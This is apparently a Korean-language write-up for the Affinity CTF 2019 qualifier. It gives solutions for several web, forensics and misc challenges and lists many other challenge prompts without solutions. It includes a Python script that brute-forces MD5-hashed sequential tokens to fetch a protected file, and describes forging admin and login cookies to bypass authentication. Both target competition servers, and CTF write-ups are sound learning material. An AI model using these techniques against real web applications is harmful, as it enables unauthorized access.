# Affinity CTF 2019 Quals


## Web
[Download me ...](#download-me-...)  
[Hello unknown](#Hello-unknown)  

## Forensics
[Reflection](#Reflection)
[Man In the Middle](#Man-In-the-Middle)
[Pharmacist Nightmare](#Pharmacist-Nightmare)

## Misc
[Sanity Check](#Sanity-Check)
[DISC ORDer](#DISC-ORDer)
[MIDI1](#MIDI1)
[1so2nd3er_maschine](#1so2nd3er_maschine)
[Reading Disfunction](#Reading-Disfunction)
[F-word](#F-word)
[UFO Sounds](#UFO-Sounds)
[Dancing Queen](#Dancing-Queen)
[Random Memory](#Random-Memory)
[MIDI2](#MIDI2)

## Re
[Backdoor](#Backdoor)
[Evol Corp 1988](#Evol-Corp-1988)

## Stego
[Falling into Spiral](#Falling-into-Spiral)
[Stegoego](#Stegoego)
[Alphinity](#Alphinity)
[XY_FUN](#XY_FUN)
[sQRt(follow the white rabbit)](#sQRt-follow-the-white-rabbit)
[Intensity Overload](#Intensity-Overload)

## Crypto
[Alan said.](#Alan-said.)
[9th Symphony](#9th-Symphony)
[Breaking Bad](#Breaking-Bad)
[GolanG Heights](#GolanG-Heights)
[Epic Poem](#Epic-Poem)
[Grains of Sand](#Grains-of-Sand)

# Download me ...
http://165.22.22.11:25632
## play
웹 코드를 보면 다른 링크에는 `token`값이 넘어가는데 `flag.txt`만 안넘어간다. token은 `md5` 해시가 적용된 값이었고, 복원해보면 숫자값이었다. 숫자를 `bruteforce attack`을 이용해서 flag.txt의 token값을 구했다.
```python
'''
Code by Hyojin(t0paz)
https://github.com/hyojinlee98

Modify by Jaeseung(g0pher)
'''
import requests
import hashlib

url = 'http://165.22.22.11:25632/download.php?file=flag.txt&token='

def req(token) :
    res = requests.get(url+token)
    if "Invalid token" not in res.text :
        print("[!] token is " + token)
        print("  => " + res.text)
        return True
    return False
        
i = 0
chk = False
while not chk :
    print("[*] Try : " + str(i))
    token = hashlib.md5(str(i).encode('utf-8')).hexdigest()
    i += 1
    chk = req(token)
```
**result**
```
[*] Try : 0
[*] Try : 1
[*] Try : 2

(...)

[*] Try : 34
[!] token is e369853df766fa44e1ed0ff613f563bd
  => AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}
```
## flag
`AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}`


# Hello unknown
http://165.22.22.11:25633/
## play
쿠키정보를 보면 `user`에 `unknown`이라는 데이터가 들어있다. `admin`으로 바꾸면 admin으로 로그인 되어 flag탭이 새로 생긴다. 그러나 그 탭에 들어가보면 flag를 주지 않는다. `burpsuite`를 켜고 조금 둘러보니 로그인을 할 때 `logged`라는 쿠키가 생겼다가 사라진다. 로그인 실패 시 이 쿠키에 `false`라는 값이 담기는데, `true`로 바꾸어주면 flag를 볼 수 있다.
## flag
`AFFCTF{n3v3r_7ru57_u5er5_1npUt}`

# Reflection
## play
`task.gif` 파일이 주어졌다.
``` bash
Reflection git:(master) ✗ binwalk task.gif

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             GIF image data, version "89a", 480 x 480
285539        0x45B63         gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
285695        0x45BFF         GIF image data, version "89a", 540 x 283
491472        0x77FD0         gzip compressed data, from Unix, NULL date (1970-01-01 00:00:00)
```
`binwalk`로 확인해 보니 `GIF Image`가 숨어있었다. `-e` 옵션으로 추출했다.
``` bash
➜ Reflection git:(master) ✗ binwalk -e task.gif &
[1]  + 10372 exit 3     binwalk -e task.gif
➜ Reflection git:(master) ✗ ls
_task.gif.extracted  task.gif
➜ Reflection git:(master) ✗ cd _task.gif.extracted
➜ _task.gif.extracted git:(master) ✗ ls
45B63  77FD0
➜ _task.gif.extracted git:(master) ✗ file *
45B63: POSIX tar archive (GNU)
77FD0: POSIX tar archive (GNU)
```
추출된 파일을 `file` 명령어로 보니 tar 파일이었다. 압축을 해제해주니 플래그 파일이 나왔다.
```
➜ _task.gif.extracted git:(master) ✗ tar -xvf 45B63
flag.txt
➜ _task.gif.extracted git:(master) ✗ cat flag.txt
AFFCTF{m@k3s_y0u__th0nk}
```
## flag
`AFFCTF{m@k3s_y0u__th0nk}`



# Man In the Middle
Note: put flag into AFFCTF{} format.

# Pharmacist Nightmare
Our malware intercepted traffic from one of drugstore computers. Can you find prescription?

hint[... i need your signature Sir..... here under prescription please...]

# Sanity Check
Just a Sanity Check. Flag is: AFFCTF{S4nity_1s_V4nity_!}
## flag
`AFFCTF{S4nity_1s_V4nity_!}`

# DISC ORDer
"... i remember times when proper floppy DISC ORDer matters..."
## fishing
문제에 낚여서 플로피 디스크에 대해서 계속 검색했다. 왜 `ORDer`이렇게 대소문자가 이상하게 되어있는지 의문이 들었는데, `DISCORD`였다. 대회 홈페이지에 처음 접속할 때 있었던 DISCORD 링크로 들어가서 방 제목에서 플래그를 얻었다.
## flag
`AFFCTF{Pr0p3r_C0ms_aR3_4lways_g00d!}`

# MIDI1
plaintext plaintext everywhere....
## solve
주어진 pcap 파일을 열어서 `tcp stream`을 확인해보면 플래그가 보인다.
## flag
`AFFCTF{s3lf_sign3d_is_good_3nough}`

# 1so2nd3er_maschine
100
Note: put flag into AFFCTF{} format

# Reading Disfunction
150
nc 165.22.22.11 9999

# F-word
200
```
^^^^!^^^^-A?--&-----&&^^^&^!^^^-A?^&!^^^^^-A?--&^^!^^-----A?&-!^^^^^-A?^^&^!^^^^^-A?&^!^^^-A?^^&!^^^-A?---&-!^---A?&^!^------A?&---!^--A?&--!^-----A?&^^!^^^--A?&^^^^^^^^^^^^&^^^&^!^^^-A?^^^&-------------&-!^^^--A?--&^^^!^^^^^-A?^&---!^---A?--&--------&-----&^!^---A?^&^!^^^--A?^&^!^^^^^--A?^&^!--^^^A?^&!^^^^^-A?--&^^^^^^^^^^^^^^&^^^^^&-!^---A?-&&&^^!^^---A?*&
```


# UFO Sounds
200
S.E.T.I program captured strange message from outer space.


# Dancing Queen
250
...greetings from Sweden...

Note: gzip -d dancing_queen.tar.gz; docker import dancing_queen.tar dancing:queen ; docker run -i -t dancing:queen /bin/sh

# Random Memory
300
nc 165.22.22.11 5566


# MIDI2
600
John White is a programmer and musician. John likes to keep his space private and things that are not common.


# Backdoor
500
Our security forensics found suspicious file on one of our servers.

Note: Put flag into AFFCTF{} format.

# Evol Corp 1988
700
Sam Sepiol pwned one of the Evol Corp office computers. But stuck in get into one their mainframes. To avoid detection he download only one file and connection dropped.

# Falling into Spiral

# Stegoego

# Alphinity

# XY_FUN
300
Note: put flag into AFFCTF{} format

# sQRt(follow the white rabbit)

# Intensity Overload
700
https://www.youtube.com/watch?v=7xxgRUyzgs0

Note: put flag into AFFCTF{} format.


# Alan said.
100
Note: put flag into AFFCTF{} format and remove whitespaces


# 9th Symphony
150
x3jAgo.{',3p1f{cO{y00{m4cBoyp3am

Note: put flag into AFFCTF{} format

# Breaking Bad
150
HoRfSbMtInMcLvFlAcAmInMcAmTeErFmInHoLvDbRnMd

Note: put flag into AFFCTF{} format.

# GolanG Heights
Note: put flag into AFFCTF{} format

# Epic Poem
Alicja sent text for her friend translator Bob. Because Alicja likes privacy, she encrypted text with key. Bob translate the text and sent back to her also in ecrypted form. Can you find the key?

# Grains of Sand
...sand...

